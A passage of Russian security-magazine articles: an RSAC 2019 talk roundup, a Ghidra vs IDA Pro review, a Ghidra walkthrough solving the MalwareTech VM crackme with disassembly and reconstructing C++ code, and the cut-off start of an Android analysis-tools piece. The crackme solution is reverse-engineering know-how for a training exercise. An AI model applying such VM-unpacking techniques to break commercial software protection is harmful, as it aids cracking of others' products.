но. Обычно вре доносный код связывается с C&C через одинаковые про‐
межутки времени и при этом генерирует характерный трафик, в котором мож‐
но выявить закономерные шаб лоны. Докладчик рекомендует бесплатный инс‐
трумент RITA собственной раз работки. Он эффективно анализирует трафик
исходящих соединений, и, используя его в комплексе с Bro/Zeek, можно
гораздо легче обнаруживать следы, оставлен ные C&C‐мал варью.


КАК БЕЗОПАСНИКУ ПОДТОЛКНУТЬ ПОЛЬЗОВАТЕЛЯ К НУЖНОМУ
ПОВЕДЕНИЮ
The Art of the Nudge: Cheap Ways to Steer User Behavior (PDF)





Тебе доводилось бывать в кафе, где в меню подсчитаны калории, чтобы
помочь  тебе  сделать  осоз нанный  выбор  в  пользу  здоровой  пищи?
Это хороший пример техники, которая не пыта ется манипулировать поль‐
зователем, а взывает к его здра вому смыслу и ненавязчиво под талкивает
к правильному решению. Нечто подобное мож но делать и для улучшения
информационной гигиены! Конкретные приемы зависят от времени, места
и обстоятельств, но есть три ключевых фактора, которые играют решающую
роль в успехе каждого из них:
 • прием должен включать в себя вычис ление понятной метрики — наподо‐
   бие потребленных человеком калорий;
 • прием должен способствовать выработке лучшего или более рациональ‐
   ного решения;
 • он должен опираться на когнитивные предубеж дения человека.

Например, вот две типичные проблемы, которые уже превратились в хро‐
ническую голов ную боль для безопас ников: первая — пользователи рас‐
печатывают конфиденциальную информацию и кла дут ее на рабочий стол,
где она остается, даже когда они уходят на обед; вторая — пользовате ли
отправляют элек тронную почту с конфиденциальной информацией тем, кто
не уполномочен получать ее.
   Какие приемы можно придумать для решения этих проблем? Чтобы
побудить пользователей перестать распечатывать страницы с конфиден‐
циальной информацией, можно, к при меру, сделать такой психологический
барьер: документ отправляется на печать только после того, как поль‐
зователь вводит в всплывающем окне обоснование — зачем его распечатать.
  Для электронной почты мож но подключить модуль, который будет искать
по ключевым словам и показывать пользователю, какая в его письме содер‐
жится конфиденциальная информа ция.
  Прослушав выступление, ты научишься самос тоятельно придумы вать
такие приемы по алгоритму, который предста вил докладчик.


УРОКИ, ИЗВЛЕЧЕННЫЕ ЗА ТРИДЦАТЬ ЛЕТ ПРОВЕДЕНИЯ
ТРЕНИНГОВ НА ПОВЫШЕНИЕ ОСВЕДОМЛЕННОСТИ
Lessons Learned from 30+ Years of Security Awareness Eﬀorts





Докладчик делится опытом из своей тридцатилетней практики: рассказывает,
какие образовательные подходы сра батывают чаще всего, а какие даже
и пробовать нет смысла, развеивает многие распространенные заблуждения
об «осведомленности о безопас ности». Вот клю чевые тезисы доклада.
 1. Сторителлинг не панацея. Поделиться увлекатель ной историей из жизни
  о том, как кто‐то стал жертвой соци альной инженерии, и затем, опираясь
   на этот рассказ, посоветовать что‐то вроде «Вот приемы, которы ми поль‐
   зуются социальные инженеры. Не поддавайтесь на них!» — это один
   из самых распростра ненных и в то же время один из самых бесполезных
   способов защиты от социальной инженерии.
 2. Осведомленность о безопас ности — это лишь стратегия снижения риска,
   а не стопроцентная защита.
 3. За каждым «тупым юзверем» стоит еще более тупой безопасник.
 4. Не упускай из виду реальные цели повышения осведомленнос ти.
 5. Ища научную опору, надо сос редотачиваться на социологии, а не пси‐
   хологии.
 6. Геймификация — это не игра.
 7. Отталкивайся от опыта тра диционной физичес кой безопасности. В этой
   области изучается поведение, которое приводит к улучшению. Здесь про‐
   водится много исследований, потому что травмы на рабочем месте стоят
   больших денег. Специалис ты в области безопасности знают, что 90%
   травм на рабочем мес те — это результат воздействия окру жающей среды.
   То есть условий, спо собствующих при чинению травм. Лишь 10% —
   это результат небрежности и невыполнения процедур.
 8. Культура — лучший инстру мент осведомленнос ти. У твоей компании
  может быть лучшая в мире программа повышения осве домленности.
  Но если пользователь‐новичок, выходя на работу, видит, что его собратья
   ведут себя неправиль но, он естес твенным образом будет поступать так
   же. Аналогично — если программы повыше ния осведомленности нет,
   но все естественным обра зом ведут себя безопас но, то новичок тоже
   переймет такое поведение.





Полный каталог материалов с RSAC 2019 ты най дешь на сайте конференции.
Если тебе приглянулось что‐то интересное, что мы упус тили в этом списке,
не забудь поделиться находкой в комментариях!
COVERSTORY

    GHIDRA
    VS    IDA PRO





 НА ЧТО СПОСОБЕН БЕСПЛАТНЫЙ ТУЛКИТ
    ДЛЯ РЕВЕРСА, СОЗДАННЫЙ В АНБ





В марте 2019 года Агентство национальной
безопасности США  (NSA) опубликова ло
инструментарий для реверс‐инжинирин га
под названием Ghidra. Пару лет назад я уже
слышал это название из утечек на сайте              Nik Zerof                                                                                              xtahi0nix@gmail.com
WikiLeaks и был весьма заин тересо ван, чем
же пользуются в NSA для реверса. Настала
пора удовлетворить любопытство и пос‐
мотреть, хороша ли бесплатная «Гидра»
в сравнении с зарекомендовав шими себя
инструментами.


Проб лема доверия
АНБ в рамках программы Technology Transfer Program уже откры ло исходные
коды 32 проектов (пол ный список можно пос мотреть на GitHub). Конечно,
не обходится без шуточек о том, что АНБ будет использовать эти средства
для слежения за пользователями. С одной сто роны, конечно, код продуктов
открыт, а их пользователи дос таточно хардкорны, чтобы не полениться про‐
вести аудит. С другой — первый же косяк нашел ся сра зу после релиза Ghidra.
  Британский ИБ‐эксперт и гла ва Hacker House Мэттью Хики (Matthew Hick‐
ey) заметил, что в отладочном режиме инс трумент Ghidra открывает и слу‐
шает порт 18001. Это поз воляет подключиться к Ghidra удаленно, через
JDWP, — разумеется, с целью все той же отладки. Хики отмечает, что испра‐
вить проблему совсем нес ложно — дос таточно поменять строку 150 в файле
support/launch.sh со звездочки на 127.0.0.1.
  Постепенно всплывают и дру гие баги. Нап ример, была найдена воз‐
можность эксплуатировать XXE при условии, что пользователь Ghidra откроет
специально сформированный проект. Так что будь начеку!


Скачать Ghidra можно с официального сайта ghidra‐sre.org, но есть неболь‐
шая проблема: сайт недоступен из российских сетей (и, по некоторым дан‐
ным, из канадских). Но я думаю, что это не препятс твие для читателей
«Хакера». Можно воспользовать ся любым VPN или на крайний случай Tor.





                 Архив Ghidra в распакованном виде

Итак, ты скачал архив ghidra_9.0_PUBLIC_20190228 и распаковал его. Давай
немного пробежимся по основным папкам и пос мотрим, что в них.
  Настоятельно рекомендую заглянуть в папку docs — там много информа‐
ции о самой Ghidra, о раз работке плагинов для нее и обзор основных воз‐
можностей в виде слайдов и документов PDF. Вся информация, естественно,
на английском.
  Далее идут папки с лицензиями — в них ничего интересного. В папке serv‐
er есть инструментарий для запуска сервера уда ленной отладки. В папке sup‐
port  собраны  вспомогательные  инс трументы,  без  которых  программа
работать не будет.
  В папке Ghidra уже интереснее: в Processors можно ознакомиться со все‐
ми поддерживаемыми архитектурами. Вот их полный спи сок: 6502, 68000,
6805, 8051, 8085, AARCH64, ARM, Atmel, CR16, DATA, JVM, MIPS, PA‐RISC, PIC,
PowerPC, Sparc, TI_MSP430, Toy, x86, Z80.





             Папки с инструкциями для разных архитек тур

Настало вре мя смотреть само приложение! Чтобы открыть Ghidra в Windows,
запускаем ghidraRun.bat,  в  Linux —  ghidraRun.sh. Проект  написан
в основном на Java, поэтому качай и ставь Java Runtime, если у тебя его нет.





                    Окно создания проекта

Первым делом нам предлага ют создать про ект, в который мы добавим нуж‐
ные бинарные файлы для исследова ния. Пос ле это го становится активной
иконка с зеленым драконом, которая и откро ет для нас CodeBrowser —
основную среду для работы.





                 Ос новное окно CodeBrowser

Сначала появляется окно с технической информацией о загружаемом фай ле,
потом приглашение провес ти анализ и выб рать опции для него. Соглаша‐
емся. Выглядит основной интерфейс довольно непривычно — во вся ком слу‐
чае, для меня.





                           CodeBrowser

И вот мы оказываемся в заголовке нашего фай ла. Перед нами структура IM‐
AGE_DOS_HEADER, а не точка входа. Интересно! Надо сказать, что все поля
отображены кор ректно, да и выг лядит все более‐менее сносно и информа‐
тивно.


             INFO

                    При первом запуске приложения я столкнулся
                        с немного неудобным отображением кода и дру‐
                         гих полей в различных окнах дизассемблера.
                    Но все это можно настроить при помощи спе‐
                       циальной кнопки Edit the listing ﬁelds в верхнем
                      правом углу каждого окна.


Справа располагается окно декомпилятора, к нему мы еще вернемся. Там же
есть вкладка Functions. Давай нажмем на нее.





                         Вкладка Functions

Здесь видим список функций с их сигнатурами — очень удобно, на мой
взгляд. Давай выберем какую‐нибудь функцию и пос мотрим, что будет.





            Начальный код дизассемблированной функции

Это самое начало функции с ее сигнатурой, передаваемые в нее значения
и их типы, возвращаемое зна чение, конвенция вызова и сам дизас семблер‐
ный листинг. В самом верху есть кнопка Display Function Graph, я ее выделил
на скриншоте. Жмем на нее.





               Графичес кое представление кода в Ghidra





               Графичес кое представление кода в IDA Pro

При наведении на кодовые блоки появляется забавная анимация (видна
на скриншоте). Я специально сделал два скриншота одной и той же функции:
один в представ лении гра фа в Ghidra, дру гой — в IDA Pro. Не знаю, как тебе,
но, на мой взгляд, информативнее граф в Ghidra. К тому же Ghidra помечает
прямо в графе конструкции if… else. Я понимаю, что это все ребячество,
но лично для меня  гра фическое представление кода  в  Ghidra более
информативно и удоб но, нежели в IDA Pro. Кро ме того, графичес кое пред‐
ставление весьма гибко настра ивает ся.
   Также у Ghidra широкие возможности поиска — чтобы увидеть все вари‐
анты, достаточно выбрать в меню фрей мворка пункт Search и посмотреть
выпадающий список. Например, вот так выглядит диалог поиска по строкам.





                    Окно поис ка по строкам

Еще Ghidra прекрасно стро ит перекрестные ссылки на что угодно — чтобы
воспользоваться этой воз можностью, нужно выб рать в контекс тном меню
пункт References, а далее выбирать то, что тебя интересу ет. Кроме этого,
в начале каждой функции Ghidra старается сра зу отобразить в комментариях
перекрестные ссылки на эту функцию.
  В Ghidra есть встроенный шестнад цатеричный просмотрщик. Чтобы его
увидеть, нужно открыть меню «Windows → Bytes».





                   Встроенный HEX‐прос мот рщик

Ghidra из коробки поддерживает патчинг ассемблерного кода. Чтобы вос‐
пользоваться этой функцией, нужно выделить строчку кода и нажать ком‐
бинацию Ctrl + Shift + G либо выбрать соответствующий пункт в контекс‐
тном  меню.  Есть  интерес ная  визуальная фишка —  если  выделить
какой‐нибудь код в окне декомпилятора, то такой же код автоматически
выделяется в окне дизас семблерного лис тинга.





                  Выделение кода в Ghidra

Еще одна интересная фишка Ghidra — это Script Manager, набор скриптов
на все случаи жизни, поставляющийся из коробки. Если какого‐то скрипта
не хватает, разумеется, его можно добавить. Все скрипты написаны на Java.
Чтобы ты понимал, о чем идет речь, прилагаю полный листинг скрипта Cre‐
ateExportFileForDll.java. Что он делает, думаю, понятно из названия! :)


import generic.jar.ResourceFile;
import ghidra.app.script.GhidraScript;
import ghidra.app.util.opinion.LibraryLookupTable;


public class CreateExportFileForDLL extends GhidraScript {
  @Override
  public void run() throws Exception {
    // Push this .dll into the location of the system .exports files.
    // Must have write permissions.
    ResourceFile file = LibraryLookupTable.createFile(currentProgram,
 false, true, monitor);


    println("Created .exports file : " + file.getAbsolutePath());
  }
}

Скрипты можно редактировать во встроенном простеньком редакторе,
а можно открывать в IDE Eclipse пря мо из контекс тного меню. Разумеется,
Eclipse должен быть уста новлен.
  Кроме того, есть разные полезные мелочи, типа встроенного диф фера,
возможности патчить код без всяких дополнительных плагинов, возможности
смотреть энтропию кода и строить дерево вызовов в приложении (трассу).
Имеется встроенный интерпретатор Python (не требуется его устанавливать
отдельно, как в IDA) и другие приятные фишки.
   Теперь давай посмотрим на декомпилятор, который также идет в комплек‐
те, а не отдельным плагином, как в IDA. Приведу сначала результат работы
декомпилятора Ghidra, а потом и IDA Pro.
   Это листинг Ghidra:


undefined8 FUN_1400010b0(void)
{
ushort uVar1;
longlong *plVar2;
LPCSTR lpMultiByteStr;
ushort *puVar3;
longlong *plVar4;
longlong in_GS_OFFSET;
ushort local_d8 [104];


plVar2 = *(longlong **)(*(longlong *)(*(longlong *)(in_GS_OFFSET +
0x60) + 0x18) + 0x18);
lpMultiByteStr = FUN_140001448(&DAT_140003000);
MultiByteToWideChar(0,1,lpMultiByteStr,‐1,(LPWSTR)local_d8,100);
plVar4 = plVar2;
do {
plVar4 = (longlong *)*plVar4;
if (plVar4[6] != 0) {
  puVar3 = local_d8;
  while( true ) {
    uVar1 = *(ushort *)((plVar4[0xc] ‐ (longlong)local_d8) + (
longlong)puVar3);
    if ((uVar1 == 0) && (*puVar3 == 0)) goto LAB_140001140;
    if ((uVar1 < *puVar3) || (uVar1 >= *puVar3 && uVar1 != *puVar3))
break;
    puVar3 = puVar3 + 1;
  }
}
} while (plVar2 != plVar4);
LAB_140001140:
return plVar4[6];
}

А это листинг IDA Pro Hex‐Rays:


__int64 sub_1400010B0()
{
unsigned __int64 v0; // rax
_QWORD *v1; // rdi
_QWORD *v2; // rbx
const CHAR *v3; // rax
WCHAR *i; // rax
WCHAR v5; // cx
WCHAR WideCharStr; // [rsp+30h] [rbp‐D8h]


v0 = __readgsqword(0x60u);
v1 = *(_QWORD **)(*(_QWORD *)(v0 + 24) + 24i64);
v2 = *(_QWORD **)(*(_QWORD *)(v0 + 24) + 24i64);
v3 = (const CHAR *)sub_140001448(&unk_140003000);
MultiByteToWideChar(0, 1u, v3, ‐1, &WideCharStr, 100);
while ( 1 )
{
v2 = (_QWORD *)*v2;
if ( v2[6] )
  break;
LABEL_9:
if ( v1 == v2 )
  return v2[6];
}
for ( i = &WideCharStr; ; ++i )
{
v5 = *(WCHAR *)((char *)i + v2[12] ‐ (_QWORD)&WideCharStr);
if ( !v5 && !*i )
  break;
if ( v5 < *i || v5 > *i )
  goto LABEL_9;
}
return v2[6];
}

Как по мне, так листинг Ghidra читается попроще. Да, я знаю, что вывод Hex‐
Rays гибко настраивается. Помимо этого, есть плагин  HexRaysPyTools,
который помогает еще улучшить результат. Но мы‐то прежде все го говорим
о том, что идет в комплекте, а Hex‐Rays еще и стоит отдельных денег.
   Так или иначе, модуль декомпиляции в Ghidra могучий и впол не может
составить конкуренцию Hex‐Rays. А если зайти в папку \Ghidra\Processors,
затем выбрать любую архитектуру и далее зай ти в \data\languages, можно
увидеть файлы с расширениями *.slaspec и *.pspec и еще некоторые. Глядя
на них, понимаешь, что написать поддержку своей архи тектуры — вполне
реальная задача. Да, все‐таки открытости кода сильно не хватает IDA Pro!


ЗАКЛЮЧЕНИЕ
Итак, мы рассмотрели фреймворк для реверс‐инжиниринга Ghidra. Сможет
ли он заменить IDA Pro? Я думаю, что на данном этапе своего существо‐
вания — нет. Дело в том, что Java в качес тве языка для написания подобных
программ, на мой взгляд, не лучший выбор. И дело, конечно, в скорости.
  Дизассемблер работает небыс тро, осо бенно на тяжелых файлах. Скажу
больше: файлы размером свыше 150 Мбайт реверсить на Ghidra — то
еще испытание. С другой стороны, Ghidra кросс‐плат форменна, и для кого‐то
это может быть важно.
  Следующий момент — это количество поддержи ваемых архитектур и заг‐
рузчиков файлов: у IDA Pro их значительно боль ше. Еще очень не хватает
такой же плотной интеграции с отладчиками, как в IDA Pro. Опять же, откры‐
тость кодов (если NSA выполнит обещание) — это хорошо, да и возможность
добавлять поддержку других архитектур — по‐настоящему крутая фишка.
Но пока будет выполнена эта работа (и исправлены баги), пройдут годы.
  Вообще, у меня сложилось стойкое впечатление, что Ghidra — это не
конечный продукт. В том виде, в котором этот фреймворк доступен сейчас, он
тянет на бета‐версию с публичным доступом, но никак не на версию
под номером девять. Кстати, в наз вании архи ва есть слово PUBLIC. Навер‐
няка где‐то есть еще и версия PRIVATE.
  Безусловно, у Ghidra есть свои силь ные сто роны, и в чем‐то она уже пре‐
восходит IDA Pro, но слабых мест пока что намного больше. А вот раз работ‐
чикам IDA есть что позаимствовать в новом инстру менте. Например, мне пон‐
равилась повышенная информа тивность кода, представленного в виде гра‐
фа. Да и само построение графа кода выглядит более строго и упорядочен‐
но. Есть патчинг инструкций без дополнительных плагинов и без разделения
на x64 и x86. Зачем держать два ярлыка на рабочем столе, если дос таточно
одного? В общем, Ильфаку еще есть куда двигаться! :)
COVERSTORY
    GHIDRA
    VS   CRACKME





   ОБКАТЫВАЕМ КОНКУРЕНТА IDA PRO
        НА ПРИМЕРЕ РЕШЕНИЯ
        ХИТРОЙ КРЭКМИ С VM




Чтобы испытать новое средство для ревер‐
са, созданное в стенах АНБ США, я решил
поломать  замечательную  и  несложную
крэкми MalwareTech. Выбрал ее неслучай‐
но. В одной из своих ста тей я расска зывал              Nik Zerof                                                                                              xtahi0nix@gmail.com
о том, как устроена виртуализация кода,
и мы даже написали простенькую виртуал‐
ку. А теперь давай посмотрим, как ломать
такую защиту.


Скачать крэкми можно с сайта MalwareTech, пароль к архиву — тоже Mal‐
wareTech.
   Итак, для начала посмотрим, что в архиве. Видим исполняемый файл vm1.
exe и файл дампа ram.bin. В пояс нении на сайте написано, что мы имеем
дело с восьмибитной виртуальной машиной. Файл дампа — не что иное,
как кусок памяти, в котором вперемешку расположены рандомные данные
и флаг, который мы должны найти. Оставим пока в покое файл дампа и пос‐
мотрим на vm1.exe через программу DiE.





                  Крэкми в ана лизаторе Detect It Easy

DiE не показывает ничего интерес ного, с энтропией все в порядке. Значит,
никакой навесной защиты нет, но проверить все равно стоило. Давай заг‐
рузим этот файл в Ghidra и посмотрим, что она выдаст. Я приведу пол ный
листинг приложения без функций (он совсем небольшой) — чтобы ты понял,
с чем мы имеем дело.


PUSH   EBP
MOV    EBP ,ESP
SUB    ESP ,0x94
LEA    ECX =>local_94 ,[0xffffff70  + EBP ]
CALL   MD5::MD5
PUSH   0x1fb
PUSH   0x0
CALL   dword ptr [‐>KERNEL32.DLL::GetProcessHeap ]
PUSH   EAX
CALL   dword ptr [‐>KERNEL32.DLL::HeapAlloc ]
MOV    [DAT_0040423c ],EAX
PUSH   0x1fb
PUSH   DAT_00404040
MOV    EAX ,[DAT_0040423c ]
PUSH   EAX
CALL   memcpy
ADD    ESP ,0xc
CALL   FUN_004022e0
MOV    ECX ,dword ptr [DAT_0040423c ]
PUSH   ECX
LEA    ECX =>local_94 ,[0xffffff70  + EBP ]
CALL   MD5::digestString
MOV    dword ptr [local_98  + EBP ],EAX
PUSH   0x30
PUSH   s_We've_been_compromised!_0040302c
MOV    EDX ,dword ptr [local_98  + EBP ]
PUSH   EDX
PUSH   0x0
CALL   dword ptr [‐>USER32.DLL::MessageBoxA ]
PUSH   0x0
CALL   dword ptr [‐>KERNEL32.DLL::ExitProcess ]
XOR    EAX ,EAX
MOV    ESP ,EBP
POP    EBP
RET

Как видишь, код простой и легко читается. Давай воспользуемся деком‐
пилятором Ghidra и посмотрим, что он выдаст.


undefined4 entry(void)
{
HANDLE hHeap;
char *lpText;
DWORD dwFlags;
SIZE_T dwBytes;
MD5 local_94 [144];


MD5(local_94);


dwBytes = 0x1fb;
dwFlags = 0;


hHeap = GetProcessHeap();
DAT_0040423c = (char *)HeapAlloc(hHeap,dwFlags,dwBytes);
memcpy(DAT_0040423c,&DAT_00404040,0x1fb);


FUN_004022e0();


lpText = digestString(local_94,DAT_0040423c);
MessageBoxA((HWND)0x0,lpText,"We\'ve been compromised!",0x30);


ExitProcess(0);
return 0;
}

Я добавил отступы для удобочитаемости — отделил объ явле ния переменных
от остального кода. Код весь ма прос той: сначала выделяется память в куче
(GetProcessHeap  ... HeapAlloc), далее в нее копируется 0x1fb(507) байт
из DAT_00404040. Но у нас нет ничего интересного в 00404040! Вспоминаем,
что в инструкции к крэкми говорилось, что ram.bin — это кусок памяти.
Разумеется,  если  пос мотреть  раз мер  файла,  он  оказывается  рав‐
ным 507 байт.
   Загружаем ram.bin в HxD или любой другой шестнадцатеричный редактор
и смотрим.





                  Файл ram.bin в HxD Hex Editor

Увы, ничего внятного там не обнаруживаем. Но логика работы немного про‐
ясняется: DAT_0040423c — это ram.bin (наши выделенные 507 байт в куче).
Давай пере именуем DAT_0040423c в RAM, чтобы было удоб нее ориенти‐
роваться в коде. Далее заходим в функцию FUN_004022e0.





          Графическое представление функции FUN_004022e0

Вот декомпилированный код функции:


void FUN_004022e0(void)
{
byte bVar1;
uint uVar2;
byte bVar3;
byte local_5;


local_5 = 0;
do {
uVar2 = (uint)local_5;
bVar1 = local_5 + 1;
bVar3 = local_5 + 2;
local_5 = local_5 + 3;
uVar2 = FUN_00402270((byte *)(uint)*(byte *)(RAM + 0xff + uVar2),
                     (uint)*(byte *)(RAM + 0xff + (uint)bVar1),
                     *(undefined *)(RAM + 0xff + (uint)bVar3));
} while ((uVar2 & 0xff) != 0);
return;
}

Поскольку мы все‐таки знаем, что перед нами виртуальная машина, все ста‐
новится более‐менее понятно. Но чтобы дей ствительно понять псевдокод,
всегда нужно смотреть в дизассемблер, ина че псевдокод может запутать.





                 Псевдокод и дизас семблер Ghidra

Я выделил инструкции, которые выполняют инкремент переменных на еди‐
ницу. Помним, что у нас есть функция FUN_00402270, которая инициализиру‐
ется тремя параметрами. Смотрим инициализацию первого параметра.


MOVZX  ECX ,byte ptr [EBP  + local_5 ]
MOV    EDX ,dword ptr [RAM ]
MOVZX  EAX ,byte ptr [0xff  + EDX  + ECX *0x1 ]
MOV    dword ptr [EBP  + local_14 ],EAX
MOV    CL,byte ptr [EBP  + local_5 ]


ADD    CL,0x1   ; Инкремент переменной

Очевидно, что берется байт из [RAM] и им инициализируется переменная.
И такой же код при инициализации каждого аргумента функции, единствен‐
ное отличие — меняются регистры, в которых будут аргументы функции
FUN_00402270. В ито ге вызов функции выглядит таким образом:


MOV    ECX ,dword ptr [EBP  + local_c ]
PUSH   ECX
MOV    EDX ,dword ptr [EBP  + local_10 ]
PUSH   EDX
MOV    EAX ,dword ptr [EBP  + local_14 ]
PUSH   EAX
CALL   FUN_00402270

Итак, в FUN_00402270 передаются три парамет ра — три байта из [RAM], сле‐
дующие друг за другом. Заходим в функцию FUN_00402270, вот ее псевдокод:


uint FUN_00402270(byte *param_1,int param_2,undefined param_3)
{
if (param_1 == (byte *)0x1) {
*(undefined *)(RAM + param_2) = param_3;
}
else {
if (param_1 == (byte *)0x2) {
  param_1 = (byte *)(RAM + param_2);
  DAT_00404240 = *param_1;
}
else {
  if (param_1 != (byte *)0x3) {
    return (uint)param_1 & 0xffffff00;
  }
  param_1 = (byte *)(RAM + param_2);
  *(byte *)(RAM + param_2) = *param_1 ^ DAT_00404240;
}
}
return CONCAT31((int3)((uint)param_1 >> 8),1);
}

Здесь проверяется первый переданный в функцию байт, и, если он совпадает
с 0x1, 0x2 или 0x3, обра батываются следующие два аргумента. Парсинг пер‐
вого параметра особен но явно читается в дизассемблерном листинге.
По всей видимости, это интерпретатор команд виртуальной машины, который
содержит все го три команды ВМ.





          Графическое представление интерпретатора в Ghidra


PUSH   EBP
MOV    EBP ,ESP
PUSH   ECX
MOV    EAX ,dword ptr [EBP  + param_1 ]
MOV    dword ptr [EBP  + local_8 ],EAX
CMP    dword ptr [EBP  + local_8 ],0x1
JZ     LAB_0040228e
CMP    dword ptr [EBP  + local_8 ],0x2
JZ     LAB_0040229e
CMP    dword ptr [EBP  + local_8 ],0x3
JZ     LAB_004022b0
JMP    LAB_004022d1

На этом этапе я остановлюсь немного подробнее, чтобы подвести промежу‐
точный итог. Итак, мы имеем приложение, работающее с 507 байт памяти,
дамп которых у нас есть — это ram.bin. Внутри этого дампа данные, интерес‐
ные нам, переме шаны с другими, ненужными нам данными. Приложение vm1.
exe читает побайтово память в поисках инс трукций 0x1, 0x2 и 0x3, и, как толь‐
ко одна из них находится, обрабатываются следующие два бай та после них.
  Другими словами, мы имеем мнемони чес кие команды (p‐code, пи‐код),
которые  работают  со  своими  двумя  аргу ментами,  а  область  памяти
в 507 байт — не что иное, как лен та пи‐кода, переме шанная с мусором.
На самом деле не стоит пугаться мусора — обработка команд начнется
с нахождения нужного байта опкода, и будут взя ты следующие два значения,
а мусор попросту пропущен.


             INFO

                        P‐code, или «пи‐код», — реализация мнемоник
                       для собственного интерпретатора команд. Его
                   еще называют кодом «гипотетического процес‐
                       сора» — ведь, по сути, процессор для исполнения
                        пи‐кода написан кем‐то самостоятельно.


Теперь давай разберем запрограммированные опкоды команд, парсинг
которых выполняет код, показанный выше. Я буду сразу приводить код
на языке C, аналогичный дизас семблерному листингу.


LAB_0040228e:
MOV    ECX ,dword ptr [RAM ]
ADD    ECX ,dword ptr [EBP  + param_2 ]
MOV    DL,byte ptr [EBP  + param_3 ]
MOV    byte ptr [ECX ],DL
JMP    LAB_004022d5

Начнем восстанавливать логику работы вир туаль ной машины. Объ явим char
ram[507] —  это  будет  память  виртуальной машины. В  этот мас сив
при помощи функций fopen → fread → fwrite запишем содержимое файла
ram.bin. Четыре строч ки ассемблерного кода и переход — все просто: в мас‐
сив ram по значению [EBP  +  param_2] перемещаем значение param_3.
В коде это будет выглядеть таким образом:


ram[val_01] = val_02;

Начинаем анализировать следующую подпрограмму:


LAB_0040229e:
MOV    EAX ,[RAM ]
ADD    EAX ,dword ptr [EBP  + param_2 ]
MOV    CL,byte ptr [EAX ]
MOV    byte ptr [r1 ],CL    ; DAT_00404240
JMP    LAB_004022d5

Она очень похожа на предыду щую, это тоже ана лог операции MOV, но здесь
уже  используется  один  из   двух  регистров  виртуальной  машины
(DAT_00404240 в листинге), в который кладется зна чение из памяти ВМ. А с
нашей точки зрения — из мас сива ram, который адресован param_2 в дизас‐
семблерном коде, а в нашем — val_01. Другими словами, операция MOV
reg,[mem].


int r1 = 0, r2 = 0; // Объявим регистры ВМ
r1 = ram[val_01];

Последняя подпрограмма в два раза сложнее — вместо четырех строчек
кода здесь восемь! Мы берем зна чение из памяти (помнишь про наш мас сив
ram, куда мы записали содержимое ram.bin?) и сохраня ем его в регистр вир‐
туальной машины (EDX), далее берем первое значение после мне моники
в пи‐коде (ECX) и выполняем между ними операцию XOR. Результат кладем
обратно в память.


LAB_004022b0:
MOVZX  EDX ,byte ptr [r1 ]  ; DAT_00404240
MOV    EAX ,[RAM ]
ADD    EAX ,dword ptr [EBP  + param_2 ]
MOVZX  ECX ,byte ptr [EAX ]
XOR    ECX ,EDX
MOV    EDX ,dword ptr [RAM ]
ADD    EDX ,dword ptr [EBP  + param_2 ]
MOV    byte ptr [EDX ],CL
JMP    LAB_004022d5

На языке C это будет выглядеть таким образом:


r2 = ram[val_01];
ram[val_01] = r2 ^ r1;

Вот, собственно, и все. Виртуальная машина из трех команд восстановлена,
осталось применить результаты нашего тру да к фай лу ram.bin, чтобы заполу‐
чить искомый флаг крэкми. Как я уже говорил, для этого читаем файл в char
ram[507] и применяем декомпилятор кода ВМ. В качестве бонуса цикл
выведет мнемоники виртуальной машины в удобочитаемом виде, а в конце
напечатает иско мый флаг. Я добавил в код уточняющие комментарии.


char ram[507];      // Память ВМ, ram.bin
int r1 = 0, r2 = 0; // Регистры ВМ


for (;;)
{
    int command = (int)ram[x];  // Берем опкод команды
    int val_01 = (int)ram[x + 1];   // Первый операнд команды
    int val_02 = (int)ram[x + 2];   // Второй операнд команды


    // Дешифровка кода
    if (command == 0x1)
    {
        ram[val_01] = val_02;
        cout << "mov " << "[" <<(int)ram[val_01] << "]" << "," <<
val_02 << endl;
    }
    if (command == 0x2)
    {
        r1 = ram[val_01];
        cout << "mov " << "r1" << "," << "[" << (int)ram[val_01] <<
"]" << endl;
    }
    if (command == 0x3)
    {
        r2 = ram[val_01];
        ram[val_01] = r2 ^ r1;
        cout << "xor " << "r2" << "," << "r1" << endl;
    }
    if (command > 3 || command < 1) break;
    x += 3;
}


printf("\n%s\n", &ram);     // Напечатаем результат

После выполнения это го кода мы получим дизас семблированную ВМ и флаг.





        Результат работы вос становленной вир туальной машины


ЗАКЛЮЧЕНИЕ
Я надеюсь, что, прочитав статью, ты перес танешь пугаться слов «виртуальная
машина» или «пи‐код». Конечно, в настоящих коммерческих протекторах вро‐
де VMProtect или Themida все будет намного сложнее: там может применять‐
ся множество команд виртуальной машины, их мнемоники‐коды могут пос‐
тоянно меняться, встречаются виртуальные машины, разные антиотладочные
и антидамповые приемы, написанные на пи‐коде, и многое дру гое. Но первое
представ ление ты получил.
  Заодно мы более близко поз накоми лись с инс трументарием под наз вани‐
ем Ghidra и совершили с помощью нее первый взлом, пусть даже крэкми! :‐)
ВЗЛОМ
 МАСТХЭВ
   ДЛЯ МОБИЛЬНОЙ
     АНАЛИТИКИ
     ЧТО НУЖНО, ЧТОБЫ ВСКРЫВАТЬ
      ПРИЛОЖЕНИЯ ДЛЯ ANDROID
            НА ANDROID





                                     Шкряба Ольга
                                                     @paradisecurity





Если ты занимаешься ана литикой мобильных приложений
или разрабатываешь их, то знаешь о таких десктопных инс‐
трументах, как IDA, apktool или Jadx. Но бывает, что компь‐
ютера под рукой нет, а тебе срочно нуж но проанализировать
приложение. В этой статье я приведу примеры хороших ути‐
лит для Android, которые помогут тебе решить эту проблему.


ЭМУЛЯТОР ТЕРМИНАЛА ДЛЯ ANDROID
Инструментом Terminal Emulator for Android я пользуюсь очень давно. Он
полезен для запуска различных команд на мобиль ном устройстве. А с пра‐
вами root возможностей будет еще больше: например, ты сможешь пос‐
мотреть информацию о любом процессе или получить дос туп к фай лам
любого приложе ния.





                          Terminal Emulator for Android

Это чем‐то похоже на ADB, толь ко в контексте мобиль ного приложе ния.


XPOSED INSTALLER





                          Xposed Installer

Этот инструмент работает только под рутом и позволяет изменять приложе‐
ния и системные сервисы Android. Самые типичные примеры модификаций:
удаление из приложений рекламы, переназ начение задач на основные кноп‐
ки, увеличение времени работы батареи. Звучит весьма здорово, не так ли?
Однако самая распростра ненная проб лема, с которой сталкивается боль‐
шинство желающих пос тавить этот инстру мент, — сложность установки.
Очень часто это приложение просто не ста вится на девайс. Иногда установка
Xposed может «окир пичить» устройство.
  Принцип платформы Xposed заключается в способности загружать код
для опре деленного модуля Java перед началом любого app_process, тем
самым контролируя его поведение. Так что модули Xposed могут выпол нять
код при запуске процес са приложения. Воз можно, звучит вдохновляюще,
но на самом деле это страшная вещь. Например, ты запускаешь модуль, а он
захватывает все возможные функции приложения, включая переводы денег
